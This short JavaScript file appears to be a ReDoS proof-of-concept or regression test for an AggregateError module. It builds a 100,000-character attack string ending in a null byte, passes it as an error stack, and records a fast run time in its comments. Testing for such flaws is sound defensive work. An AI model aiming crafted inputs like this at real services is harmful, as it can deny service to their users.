const AggregateError = require("./index.js");

//Attack String :""+"a"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "\u0000";

const error = {
  message: "a",
  stack: str,
};
var aggregateError = new AggregateError([error]);

// real    0m0.229s
// user    0m0.111s
// sys     0m0.009s
